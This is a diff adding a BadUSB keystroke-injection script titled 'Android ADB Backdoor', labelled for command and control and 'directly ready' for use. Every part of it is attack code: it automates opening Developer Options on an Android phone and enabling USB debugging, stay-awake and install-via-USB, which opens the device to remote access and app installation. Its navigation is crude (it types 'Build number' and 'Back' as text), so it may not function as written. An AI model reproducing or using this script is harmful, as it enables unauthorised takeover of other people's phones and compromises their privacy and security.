@@ -1,0 +1,84 @@
+REM Title: Android ADB Backdoor
+REM Author: BadUSB Library
+REM Description: Enables ADB for remote access
+REM Target: Android 7.0+
+REM Category: Command & Control
+REM Type: Directly Ready
+
+REM Open Settings
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Settings
+ENTER
+DELAY 3000
+
+REM Navigate to Developer Options
+STRING About phone
+ENTER
+DELAY 2000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+STRING Build number
+ENTER
+DELAY 1000
+
+REM Go back to Settings
+STRING Back
+ENTER
+DELAY 1000
+
+STRING Back
+ENTER
+DELAY 1000
+
+REM Open Developer Options
+STRING Developer options
+ENTER
+DELAY 2000
+
+REM Enable USB Debugging
+STRING USB debugging
+ENTER
+DELAY 2000
+
+STRING OK
+ENTER
+DELAY 2000
+
+REM Enable Stay awake
+STRING Stay awake
+ENTER
+DELAY 2000
+
+REM Enable Install via USB
+STRING Install via USB
+ENTER
+DELAY 2000
